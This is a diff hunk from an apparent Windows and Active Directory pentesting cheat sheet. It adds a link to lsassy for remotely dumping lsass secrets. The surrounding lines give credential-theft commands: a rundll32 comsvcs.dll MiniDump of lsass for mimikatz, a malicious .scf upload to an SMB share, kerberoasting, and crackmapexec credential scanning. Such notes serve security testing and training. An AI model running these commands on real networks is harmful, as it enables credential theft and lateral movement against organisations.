@@ -21,6 +21,7 @@ _Example .url file that when clicked will send hash to attackers responder_
 * `put /{path}/index.scf ./index.scf` _upload malicous scf file to root of connected smb share_
 * [kerberoast](https://room362.com/post/2016/kerberoast-pt1/) _stealing crackable tickets from AD using kerberoasting. htb machine [Active](https://0xrick.github.io/hack-the-box/active/) is an example of this_
 * `rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump “<lsass pid> lsass.dmp full”` _Dump the lsass process to a file so it can be transfered to attacked for mimikatz.  Useful after forcing clear text lsass creds.  See tutorial page_
+* [lsassy](https://github.com/Hackndo/lsassy) _Remotely dump secrets from lsass process_
 
 ## Enumeration
 * `crackmapexec smb {ip range} -u {username} -p {password}` _scan an ip or range with valid creds to see where it's an admin or at least a valid user_
